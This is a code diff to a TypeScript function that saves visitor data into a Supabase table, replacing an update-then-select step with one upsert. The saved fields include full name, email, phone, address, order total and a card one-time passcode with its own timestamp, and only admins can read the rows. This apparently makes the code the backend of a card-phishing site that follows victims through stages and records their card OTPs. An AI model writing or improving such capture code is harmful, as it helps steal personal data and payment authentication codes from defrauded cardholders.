@@ -127,7 +127,6 @@ export const updateVisitorData = async (data: {
   if (session_id === "__admin_placeholder__") return;
 
   const now = new Date().toISOString();
-  await ensureVisitorRecord(createWindowBootstrapPayload(session_id));
 
   const stageStamps = {
     ...(data.full_name || data.email || data.phone || data.address || data.city || data.postal_code || data.plan_selected || data.order_total
@@ -140,41 +139,26 @@ export const updateVisitorData = async (data: {
     ...(data.card_otp ? { otp_at: now } : {}),
   };
 
-  // Try update first
-  const { data: updated, error: updateErr } = await supabase
-    .from("visitors")
-    .update({
+  // Always upsert directly. We can't rely on UPDATE+SELECT because the SELECT
+  // policy on `visitors` only allows admins to read rows — a regular visitor's
+  // .select() will return [] even when the update succeeded, leading us to a
+  // wrong "row missing" branch. Upsert with merge handles both create + update
+  // in a single round-trip without needing to read back.
+  const { error: upsertErr } = await supabase.from("visitors").upsert(
+    {
+      ...createWindowBootstrapPayload(session_id),
       ...data,
       ...stageStamps,
       last_seen_at: now,
       last_path: window.location.pathname,
-    })
-    .eq("session_id", session_id)
-    .select("id");
-
-  if (updateErr) {
-    console.error("[visitor] update failed", updateErr);
-    throw updateErr;
+    },
+    { onConflict: "session_id" }
+  );
+  if (upsertErr) {
+    console.error("[visitor] upsert failed", upsertErr);
+    throw upsertErr;
   }
-
-  // If no row matched (record never bootstrapped), upsert it now with all data
-  if (!updated || updated.length === 0) {
-    const { error: upsertErr } = await supabase.from("visitors").upsert(
-      {
-        ...createWindowBootstrapPayload(session_id),
-        ...data,
-        ...stageStamps,
-        last_seen_at: now,
-        last_path: window.location.pathname,
-      },
-      { onConflict: "session_id" }
-    );
-    if (upsertErr) {
-      console.error("[visitor] upsert fallback failed", upsertErr);
-      throw upsertErr;
-    }
-    markBootstrapped(session_id);
-  }
+  markBootstrapped(session_id);
 };
 
 /** Tracks the current visitor — registers on first visit, updates path on navigation. */
